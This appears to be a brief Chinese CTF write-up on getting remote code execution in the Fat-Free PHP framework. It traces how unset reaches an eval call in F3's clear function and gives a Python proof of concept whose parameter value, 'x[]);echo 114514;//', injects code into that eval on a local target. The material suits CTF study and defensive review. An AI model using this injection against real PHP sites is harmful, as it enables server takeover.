# 思路
	- 分析框架打RCE
- # 扫描
	- ```
	  /composer.json
	  /config.ini
	  /.gitignore
	  /readme.md
	  ```
	- 大概是用了[这个](https://fatfreeframework.com/3.8/getting-started)框架
- # 分析
	- F3框架中，unset的调用逻辑如下：`unset --> F3::__unset --> F3::offsetunset --> F3::clear`
	- clear函数中有这么几行，会将传入的JS风格的expression转换成PHP风格的，然后放进eval中执行
		- ```php
		  $val=preg_replace('/^(\$hive)/','$this->hive',
		                    $this->compile('@hive.'.$key, FALSE));
		  eval('unset('.$val.');');
		  ```
	- fuzz后可以写出这样的payload实现RCE
		- ```python
		  url = "http://127.0.0.1:8081"
		  
		  r = base_get(url, params = {
		      "a": "x[]);echo 114514;//"
		  })
		  print(r.text)
		  
		  ```